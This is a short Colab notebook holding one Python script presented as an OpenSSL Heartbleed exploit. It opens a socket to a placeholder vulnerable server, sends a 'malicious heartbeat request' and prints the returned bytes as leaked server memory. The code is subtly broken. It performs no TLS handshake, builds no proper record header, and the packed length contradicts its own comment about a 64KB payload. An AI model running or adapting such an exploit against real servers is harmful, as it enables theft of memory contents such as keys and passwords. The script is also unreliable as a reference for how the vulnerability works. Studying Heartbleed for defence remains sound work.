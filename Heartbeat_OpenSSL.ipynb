{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyMQp9jHL3uPY/ApMqfg7edt",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/Alan-Cheong/IEEE_QW_2020/blob/master/Heartbeat_OpenSSL.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "h6WIi0Szdefp"
      },
      "outputs": [],
      "source": [
        "import socket\n",
        "import struct\n",
        "\n",
        "def create_heartbeat_request():\n",
        "    # Heartbeat request format: Type (1), Payload Length (64KB), Payload (1 byte)\n",
        "    request = struct.pack('!BHHH', 1, 0, 0x10, 0) + b'\\x41'\n",
        "    return request\n",
        "\n",
        "# Establish a connection to the vulnerable server\n",
        "sock = socket.create_connection(('vulnerable-server.com', 443))\n",
        "\n",
        "# Send the malicious heartbeat request\n",
        "sock.send(create_heartbeat_request())\n",
        "\n",
        "# Receive the response (this contains the leaked memory)\n",
        "response = sock.recv(1024)\n",
        "\n",
        "# Print out the response (potentially leaking server memory)\n",
        "print(\"Received response:\")\n",
        "print(response.hex())\n",
        "\n",
        "sock.close()\n"
      ]
    }
  ]
}